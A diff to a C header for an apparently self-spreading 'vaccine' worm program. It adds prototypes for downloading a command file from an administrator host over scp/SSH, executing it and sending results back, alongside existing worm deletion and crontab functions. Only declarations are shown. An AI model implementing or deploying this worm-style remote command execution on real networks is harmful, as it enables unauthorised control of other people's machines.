@@ -14,6 +14,7 @@
 
  #define CMD_LEN 4096
  #define IP_LEN 16
+ #define RESULTS "vaccin.log"
 
  /*
  * Check if the program is launched by root
@@ -51,6 +52,11 @@
  bool wormDelete(char *programName, char *targetPath, char *crontab);
 
  /*
+ * Download a command file on the administrator host, execute it and send results back
+ */
+ bool informationsRecovery(char *srcCommand, char *dstPath, char *control, char *adminIP, char *scpPath, int portSSH);
+
+ /*
  * If the given ip address is defined in a network interface, returns the network mask address
  */
  char* getNetworkMask(char *ip);
@@ -84,5 +90,15 @@
  * Delete the local file
  */
  bool deleteLocalFile(char *srcFile);
+
+ /*
+ * Download a command file from the administrator host
+ */
+ bool downloadCommand(char *srcCommand, char *adminIP, char *dstPath, char *scpPath, int portSSH);
+
+ /*
+ * Execute a program and write results in a log file
+ */
+ bool executeCommand(char *commandFile);
 
 #endif /* VACCCIN_H */
